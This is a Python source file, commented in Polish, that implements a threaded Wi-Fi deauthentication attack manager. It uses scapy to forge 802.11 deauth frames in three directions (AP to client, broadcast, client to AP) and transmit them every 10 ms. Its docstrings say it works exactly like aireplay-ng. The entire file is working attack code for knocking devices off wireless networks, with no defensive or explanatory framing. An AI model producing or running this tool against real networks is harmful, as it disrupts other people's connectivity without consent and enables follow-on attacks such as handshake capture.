#!/usr/bin/env python3

from typing import Dict, Tuple
import threading
import time
from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp


class DeauthAttackManager:
    """
    Manager ataków deauth – działa dokładnie jak aireplay-ng.
    Wysyła surowe ramki Deauth bez żadnych kombinacji.
    """

    def __init__(self, debug: bool = False):
        self.debug = debug
        self._attacks: Dict[Tuple[str, str, str], Dict] = {}
        self._lock = threading.Lock()

    def log(self, msg: str):
        if self.debug:
            ts = time.strftime("%H:%M:%S")
            print(f"[DEAUTH {ts}] {msg}")

    def start_client_attack(
        self,
        client_mac: str,
        ap_mac: str,
        interface: str,
        attack_duration: int = 500,
    ) -> bool:
        """
        Uruchom atak deauth na jednego klienta.
        Pracuje dokładnie jak: aireplay-ng --deauth N -a AP_MAC -c CLIENT_MAC iface
        """

        key = (client_mac, ap_mac, interface)

        with self._lock:
            if key in self._attacks:
                self.log(f"Attack already running for {client_mac} -> {ap_mac}")
                return False

            stop_event = threading.Event()
            t = threading.Thread(
                target=self._attack_worker,
                args=(client_mac, ap_mac, interface, attack_duration, stop_event),
                daemon=True,
            )
            self._attacks[key] = {"thread": t, "stop": stop_event}
            t.start()

        self.log(f"Started deauth attack: client={client_mac}, ap={ap_mac}, iface={interface}")
        return True

    def _attack_worker(
        self,
        client_mac: str,
        ap_mac: str,
        interface: str,
        attack_duration: int,
        stop_event: threading.Event,
    ):
        self.log(
            f"Worker started for client={client_mac}, ap={ap_mac}, "
            f"iface={interface}, duration={attack_duration}s"
        )

        # --- bazowe ramki ---

        # AP -> klient
        dot11_ap_to_client = Dot11(
            type=0,          # management
            subtype=12,      # deauth
            addr1=client_mac,   # receiver
            addr2=ap_mac,       # transmitter
            addr3=ap_mac,       # BSSID
        )
        base_ap_to_client = RadioTap() / dot11_ap_to_client / Dot11Deauth(reason=7)

        # broadcast od AP
        dot11_broadcast = Dot11(
            type=0,
            subtype=12,
            addr1="ff:ff:ff:ff:ff:ff",
            addr2=ap_mac,
            addr3=ap_mac,
        )
        base_broadcast = RadioTap() / dot11_broadcast / Dot11Deauth(reason=7)

        # klient -> AP (jak na Twoim screenie z Wiresharka)
        dot11_client_to_ap = Dot11(
            type=0,
            subtype=12,
            addr1=ap_mac,      # receiver
            addr2=client_mac,  # transmitter
            addr3=ap_mac,      # BSSID
        )
        base_client_to_ap = RadioTap() / dot11_client_to_ap / Dot11Deauth(reason=7)

        end_time = time.time() + attack_duration
        sent = 0

        # losowy start sequence number, potem go inkrementujemy
        seq = 0

        try:
            while not stop_event.is_set() and time.time() < end_time:
                # za każdym razem robimy kopię i ustawiamy nowe SC
                pkt1 = base_ap_to_client.copy()
                pkt2 = base_broadcast.copy()
                pkt3 = base_client_to_ap.copy()

                pkt1[Dot11].SC = (seq & 0xFFF) << 4
                seq += 1
                pkt2[Dot11].SC = (seq & 0xFFF) << 4
                seq += 1
                pkt3[Dot11].SC = (seq & 0xFFF) << 4
                seq += 1

                sendp(pkt1, iface=interface, verbose=0)
                sendp(pkt2, iface=interface, verbose=0)
                sendp(pkt3, iface=interface, verbose=0)

                sent += 3
                # można zejść nawet niżej, np. 0.005, ale nie katujemy karty
                time.sleep(0.01)

            self.log(
                f"Worker finished for client={client_mac}, ap={ap_mac}. "
                f"Total frames sent: {sent}"
            )
        except Exception as e:
            self.log(f"Error in attack worker: {e}")
        finally:
            key = (client_mac, ap_mac, interface)
            with self._lock:
                self._attacks.pop(key, None)
    def stop_client_attack(self, client_mac: str, ap_mac: str, interface: str):
        """Zatrzymaj konkretny atak."""
        key = (client_mac, ap_mac, interface)
        with self._lock:
            info = self._attacks.get(key)
            if info:
                info["stop"].set()
                self.log(f"Stopping attack for {client_mac}")

    def stop_all_attacks(self):
        """Zatrzymaj wszystkie ataki."""
        with self._lock:
            keys = list(self._attacks.keys())
            self.log(f"Stopping all attacks ({len(keys)})...")
            for key, info in list(self._attacks.items()):
                info["stop"].set()
